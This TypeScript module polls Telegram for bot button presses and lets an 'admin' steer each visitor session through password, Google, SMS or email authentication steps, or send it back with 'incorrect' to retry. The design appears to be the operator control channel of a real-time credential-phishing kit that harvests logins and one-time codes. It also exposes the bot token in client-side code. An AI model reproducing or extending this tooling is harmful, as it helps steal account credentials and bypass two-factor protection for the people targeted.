// Telegram Callback Polling Service
// This service polls Telegram for callback button presses and handles user navigation

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

interface TelegramUpdate {
  update_id: number;
  callback_query?: {
    id: string;
    from: {
      id: number;
      first_name: string;
    };
    message: {
      message_id: number;
      chat: {
        id: number;
      };
    };
    data: string;
  };
}

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
}

class TelegramCallbackService {
  private handlers = new Map<string, CallbackHandler>();
  private lastUpdateId = 0;
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;

  /**
   * Register a callback handler for a session
   */
  registerHandler(sessionId: string, onCallback: (action: string) => void) {
    console.log("📝 Registering callback handler for session:", sessionId);
    this.handlers.set(sessionId, { sessionId, onCallback });

    // Start polling if not already started
    if (!this.isPolling) {
      this.startPolling();
    }
  }

  /**
   * Unregister a callback handler
   */
  unregisterHandler(sessionId: string) {
    console.log("🗑️ Unregistering callback handler for session:", sessionId);
    this.handlers.delete(sessionId);

    // Stop polling if no handlers left
    if (this.handlers.size === 0) {
      this.stopPolling();
    }
  }

  /**
   * Start polling for Telegram updates
   */
  private startPolling() {
    if (this.isPolling) return;

    console.log("🔄 Starting Telegram callback polling...");
    this.isPolling = true;

    // Poll every 2 seconds
    this.pollInterval = setInterval(() => {
      this.pollUpdates();
    }, 2000);
  }

  /**
   * Stop polling
   */
  private stopPolling() {
    console.log("⏹️ Stopping Telegram callback polling...");
    this.isPolling = false;

    if (this.pollInterval) {
      clearInterval(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Poll for new updates from Telegram
   */
  private async pollUpdates() {
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Simulating callback polling");

      // In demo mode, we'll check for simulated callbacks in localStorage
      this.checkForSimulatedCallbacks();
      return;
    }

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=1`,
        {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
        },
      );

      if (!response.ok) {
        console.error("❌ Failed to get Telegram updates:", response.status);
        return;
      }

      const data = await response.json();
      const updates: TelegramUpdate[] = data.result || [];

      for (const update of updates) {
        this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id);

        if (update.callback_query) {
          await this.handleCallback(update.callback_query);
        }
      }
    } catch (error) {
      console.error("❌ Error polling Telegram updates:", error);
    }
  }

  /**
   * Check for simulated callbacks in demo mode
   */
  private checkForSimulatedCallbacks() {
    const simulatedCallback = localStorage.getItem("simulatedCallback");
    if (simulatedCallback) {
      try {
        const callbackData = JSON.parse(simulatedCallback);
        if (callbackData.action && callbackData.sessionId) {
          console.log(
            "🎭 Demo mode: Processing simulated callback:",
            callbackData,
          );

          // Find the handler
          const handler = this.handlers.get(callbackData.sessionId);
          if (handler) {
            handler.onCallback(callbackData.action);
          } else {
            console.error(
              "❌ No handler found for simulated callback:",
              callbackData,
            );
          }

          // Clear the simulated callback
          localStorage.removeItem("simulatedCallback");
        }
      } catch (error) {
        console.error("❌ Error processing simulated callback:", error);
        localStorage.removeItem("simulatedCallback");
      }
    }
  }

  /**
   * Handle a callback query from Telegram
   */
  private async handleCallback(callback: any) {
    console.log("📞 Received callback query:", callback);

    const callbackData = callback.data;

    // Parse callback data: auth_TYPE_SESSIONID or incorrect_TYPE_SESSIONID or complete_auth_SESSIONID
    const parts = callbackData.split("_");
    if (parts.length < 2) {
      console.error("❌ Invalid callback data format:", callbackData);
      return;
    }

    let action: string;
    let sessionId: string;

    if (parts[0] === "auth") {
      // Format: auth_TYPE_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid auth callback format:", callbackData);
        return;
      }
      action = parts[1]; // password, google, sms, email
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "incorrect") {
      // Format: incorrect_TYPE_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid incorrect callback format:", callbackData);
        return;
      }
      action = `incorrect_${parts[1]}`; // incorrect_password, incorrect_google, etc.
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "complete") {
      // Format: complete_auth_SESSIONID
      if (parts.length < 3) {
        console.error("❌ Invalid complete callback format:", callbackData);
        return;
      }
      action = "complete";
      sessionId = parts.slice(2).join("_");
    } else {
      console.error("❌ Unknown callback action:", callbackData);
      return;
    }

    console.log("🎯 Parsed callback:", { action, sessionId });

    // Find the handler for this session
    const handler = this.handlers.get(sessionId);
    if (!handler) {
      console.error("❌ No handler found for session:", sessionId);

      // Answer the callback query to remove loading state
      await this.answerCallbackQuery(
        callback.id,
        "❌ Session expired or not found",
      );
      return;
    }

    // Answer the callback query first
    await this.answerCallbackQuery(
      callback.id,
      `✅ Redirecting to ${action} authentication`,
    );

    // Call the handler
    try {
      handler.onCallback(action);
    } catch (error) {
      console.error("❌ Error in callback handler:", error);
    }
  }

  /**
   * Answer a callback query to remove loading state in Telegram
   */
  private async answerCallbackQuery(callbackQueryId: string, text: string) {
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Would answer callback query:", text);
      return;
    }

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
        },
      );
    } catch (error) {
      console.error("❌ Failed to answer callback query:", error);
    }
  }

  /**
   * Validate Telegram token
   */
  private validateToken(): boolean {
    return TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN";
  }

  /**
   * Get polling status
   */
  getStatus() {
    return {
      isPolling: this.isPolling,
      handlersCount: this.handlers.size,
      lastUpdateId: this.lastUpdateId,
    };
  }
}

// Create singleton instance
export const telegramCallbackService = new TelegramCallbackService();

// Export utility functions
export const registerTelegramCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
) => {
  telegramCallbackService.registerHandler(sessionId, onCallback);
};

export const unregisterTelegramCallback = (sessionId: string) => {
  telegramCallbackService.unregisterHandler(sessionId);
};

export const getTelegramCallbackStatus = () => {
  return telegramCallbackService.getStatus();
};

// Utility function to simulate admin clicks in demo mode
export const simulateAdminClick = (sessionId: string, action: string) => {
  console.log("🎭 Simulating admin click:", { sessionId, action });

  localStorage.setItem(
    "simulatedCallback",
    JSON.stringify({
      sessionId,
      action,
      timestamp: Date.now(),
    }),
  );

  console.log("📝 Simulated callback stored in localStorage");
};
